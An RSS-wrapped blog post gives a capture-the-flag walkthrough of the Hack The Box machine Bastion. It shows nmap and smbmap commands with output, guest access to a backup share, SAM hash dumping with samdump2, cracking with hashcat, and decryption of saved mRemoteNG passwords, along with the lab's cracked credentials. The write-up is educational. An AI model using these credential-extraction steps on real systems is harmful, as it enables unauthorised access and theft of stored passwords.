<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>mRemoteNG on</title><link>https://blog.ikuamike.io/tags/mremoteng/</link><description>Recent content in mRemoteNG on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Â© Michael Ikua</copyright><lastBuildDate>Fri, 06 Sep 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/mremoteng/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box: Bastion</title><link>https://blog.ikuamike.io/posts/2019/bastion-htb/</link><pubDate>Fri, 06 Sep 2019 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2019/bastion-htb/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/bastion/info_card.png" alt="Bastion Info Card" class="center" style="border-radius: 8px;" />
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>Bastion was a relatively easy box. There is an smb share is accessible without credentials and inside there is a backup drive that we can mount and access. From the drive we can dump the SAM file and crack it to get login credentials. Once logged in we find mRemoteNG installed and extract its saved passwords to get admin access.&lt;/p>
&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;p>I start with this nmap command to quickly find open ports.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -sS -p- --min-rate&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> 10.10.10.134
Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.134
Host is up &lt;span style="color:#f92672">(&lt;/span>0.23s latency&lt;span style="color:#f92672">)&lt;/span>.
Not shown: &lt;span style="color:#ae81ff">65522&lt;/span> closed ports
PORT STATE SERVICE
22/tcp open ssh
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
5985/tcp open wsman
47001/tcp open winrm
49664/tcp open unknown
49665/tcp open unknown
49666/tcp open unknown
49667/tcp open unknown
49668/tcp open unknown
49669/tcp open unknown
49670/tcp open unknown
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then run a thorough service scan on the discovered ports.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -sC -sV -p 22,135,139,445,5985,47001 -oA nmap/bastion 10.10.10.134
Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.134
Host is up &lt;span style="color:#f92672">(&lt;/span>0.22s latency&lt;span style="color:#f92672">)&lt;/span>.
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH for_Windows_7.9 &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
| ssh-hostkey:
| &lt;span style="color:#ae81ff">2048&lt;/span> 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
| &lt;span style="color:#ae81ff">256&lt;/span> cc:2e:56ðŸ†Ž19:97:d5:bb:03:fb:82ðŸ’¿63:da:68:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
|_ &lt;span style="color:#ae81ff">256&lt;/span> 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> microsoft-ds
5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server &lt;span style="color:#ae81ff">2008&lt;/span> R2 - 2012; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: -42m39s, deviation: 1h09m15s, median: -2m40s
| smb-os-discovery:
| OS: Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard 6.3&lt;span style="color:#f92672">)&lt;/span>
| Computer name: Bastion
| NetBIOS computer name: BASTION&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
| Workgroup: WORKGROUP&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
|_ System time: 2019-09-06T13:28:45+02:00
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled &lt;span style="color:#f92672">(&lt;/span>dangerous, but default&lt;span style="color:#f92672">)&lt;/span>
| smb2-security-mode:
| 2.02:
|_ Message signing enabled but not required
| smb2-time:
| date: 2019-09-06 12:28:49
|_ start_date: 2019-09-06 11:58:13
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="smb">SMB&lt;/h2>
&lt;p>Based on the open ports the best service to check out first is smb.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbmap -H 10.10.10.134 -u &lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Finding open SMB ports....
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Guest SMB session established on 10.10.10.134...
&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> IP: 10.10.10.134:445 Name: 10.10.10.134
Disk Permissions
---- -----------
ADMIN$ NO ACCESS
Backups READ, WRITE
C$ NO ACCESS
IPC$ READ ONLY
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After running smbmap, I discover a share called Backups that I have read and write permissions as a guest user.&lt;/p>
&lt;p>Since this is a windows machine I will switch to my windows vm to make my work easier.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/backup_share.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;!-- raw HTML omitted -->
&lt;p>Contents of note.txt&lt;/p>
&lt;p>&lt;em>Sysadmins: please don&amp;rsquo;t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.&lt;/em>&lt;/p>
&lt;p>Going deeper into the WindowsImageBackup folder I found a backup image which is quite big. Downloading the whole file would not be an option as the note.txt suggested. Fortunately I can mount it through the share remotely, this is the reason why I wanted to use a windows vm.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/backup_share_2.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;!-- raw HTML omitted -->
&lt;p>On mounting it, it appears as Local Disk (D:). After accessing the home directory of user L4mpje and looking through the folders there was no user.txt, it must have been excluded from the backup.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/backup_share_3.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;p>At this stage I was stuck for a while (I still suck at owning windows) and after some hints in the forum I figured I should look at where credentials are stored locally on windows and how to get them. Simply the equivalent of /etc/shadow or /etc/passwd on linux.&lt;/p>
&lt;p>I learnt that I should be looking in C:\windows\system32\config for the SAM and SYSTEM files which I found.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/backup_share_4.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;h5 id="now-to-get-the-credentials">Now to get the credentials!&lt;/h5>
&lt;p>I pulled the 2 files back to my kali box and using samdump2 I got the user hash.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I then cracked the NTLM hash for L4mpje using hashcat and got the password.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">hashcat -m &lt;span style="color:#ae81ff">1000&lt;/span> -a &lt;span style="color:#ae81ff">0&lt;/span> 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt --force
26112010952d963c8dc4217daec986d9:bureaulampje
&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="exploitation">Exploitation&lt;/h1>
&lt;p>Now that I have a username and password I can login through ssh.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/bastion_5.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;p>Now that user is owned, let&amp;rsquo;s try to escalate privileges to admin.&lt;/p>
&lt;p>I switched to powershell and started looking at installed programs. mRemoteNG isn&amp;rsquo;t a default windows application so let me look into it and if it can help in privesc.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/bastion_6.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;!-- raw HTML omitted -->
&lt;p>According to their website:&lt;/p>
&lt;p>&lt;em>mRemoteNG is a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager.&lt;/em>&lt;/p>
&lt;p>I found a metasploit module that claims to extract saved passwords from mRemoteNG. Since I am logged in I don&amp;rsquo;t need metasploit so I looked at the source to see how it extracts the passwords and decrypts them.&lt;/p>
&lt;p>The saved passwords are located in AppData in mRemoteNG\confCons.xml. Once I found the file the admin password was there but encrypted.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/bastion_7.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;p>I was able to find a script on github to decrypt the password.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw&lt;span style="color:#f92672">==&lt;/span>
Password: thXLHM96BeKL0ER2
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I can finally login as administrator and own system!&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/bastion/bastion_8.png" alt="backup share" class="center" style="border-radius: 8px;" />
&lt;h1 id="references">References&lt;/h1>
&lt;ul>
&lt;li>&lt;a href="https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py" target="_blank" rel="noopener">mremoteng_decrypt.py&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://vulners.com/metasploit/MSF:POST/WINDOWS/GATHER/CREDENTIALS/MREMOTE/" target="_blank" rel="noopener">mremote metasploit module&lt;/a>
&lt;/li>
&lt;/ul></content></item></channel></rss>